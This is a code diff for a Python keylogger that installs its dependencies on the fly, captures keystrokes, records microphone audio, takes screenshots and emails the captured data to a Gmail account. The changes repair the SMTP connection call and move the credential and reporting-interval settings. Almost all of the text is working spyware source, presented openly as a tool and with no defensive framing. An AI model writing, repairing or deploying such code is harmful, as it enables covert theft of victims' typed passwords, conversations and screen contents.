@@ -15,11 +15,11 @@ except ModuleNotFoundError:
     modules = ["pyscreenshot","sounddevice","pynput"]
     call("pip install " + ' '.join(modules), shell=True)
 
-EMAIL_ADDRESS = "YOUR_EMAIL"
-EMAIL_PASSWORD = "YOUR_EMAIL_PASSWORD"
-SEND_REPORT_EVERY = 60 # as in seconds
 
 finally:
+    EMAIL_ADDRESS = "YOUR_EMAIL"
+    EMAIL_PASSWORD = "YOUR_EMAIL_PASSWORD"
+    SEND_REPORT_EVERY = 60 # as in seconds
     class KeyLogger:
         def __init__(self, time_interval, email, password):
             self.interval = time_interval
@@ -56,7 +56,7 @@ finally:
             self.appendlog(current_key)
 
         def send_mail(self, email, password, message):
-            server = smtplib.SMTP('smtp.gmail.com', 587, message.encode("utf8"))
+            server = smtplib.SMTP(host='smtp.gmail.com', port=587)
             server.starttls()
             server.login(email, password)
             server.sendmail(email, email, message)
@@ -82,7 +82,7 @@ finally:
 
         def microphone(self):
             fs = 44100
-            seconds = 10
+            seconds = SEND_REPORT_EVERY
             obj = wave.open('sound.wav', 'w')
             obj.setnchannels(1)  # mono
             obj.setsampwidth(2)
@@ -93,11 +93,10 @@ finally:
 
             self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)
 
-
         def screenshot(self):
             img = pyscreenshot.grab()
             self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)
-            
+
         def run(self):
             keyboard_listener = keyboard.Listener(on_press=self.save_data)
             with keyboard_listener:
@@ -126,6 +125,7 @@ finally:
                 except OSError:
                     print('File is close.')
 
-
     keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
     keylogger.run()
+
+
